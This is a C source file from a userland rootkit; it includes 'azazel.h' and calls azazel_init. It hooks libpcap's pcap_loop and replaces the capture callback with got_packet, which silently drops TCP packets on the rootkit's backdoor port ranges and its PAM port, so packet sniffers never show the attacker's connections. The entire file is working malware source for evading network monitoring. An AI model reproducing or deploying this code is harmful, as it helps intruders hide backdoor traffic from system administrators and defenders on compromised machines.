#include <pcap/pcap.h>
#include <netinet/in.h>
#include "const.h"
#include "azazel.h"
#include "pcap.h"

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	int size_ip;
	int size_tcp;
	int sport,dport;
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		DEBUG("Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			break;
		default:
			if (old_callback)
				old_callback(args, header, packet);
			return;
	}
	
	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		DEBUG("Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	sport = htons(tcp->th_sport);
	dport = htons(tcp->th_dport);
	
	/* Hide traffic if it's one of our ports */
	if ((sport >= LOW_PORT && sport <= HIGH_PORT) || (dport >= LOW_PORT && dport <= HIGH_PORT) || (dport == PAM_PORT) ||
	  (sport >= CRYPT_LOW && sport <= CRYPT_HIGH) || (dport >= CRYPT_LOW && dport <= CRYPT_HIGH) || (sport == PAM_PORT)) {
		return;
	} else {
		if (old_callback)
			old_callback(args, header, packet);
	}
		
	return;
}


int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
	DEBUG("pcap_loop hooked.\n");
	azazel_init();
		
	old_callback = callback;
	return (long)syscall_list[SYS_PCAP_LOOP].syscall_func(p, cnt, got_packet, user);
}
